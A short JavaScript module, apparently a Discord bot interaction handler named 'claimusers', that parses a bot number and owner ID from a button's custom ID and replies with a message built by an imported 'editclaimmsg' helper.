
const editclaimmsg = require("../../../autosecure/utils/responses/editclaimmsg");


module.exports = {
    name: "claimusers",
    editclaiming: true,
    callback: async (client, interaction) => {
        let [t, botnumber, ownerid] = interaction.customId.split("|")
        let msg = await editclaimmsg(botnumber, ownerid)
        return interaction.reply(msg)
    }
};
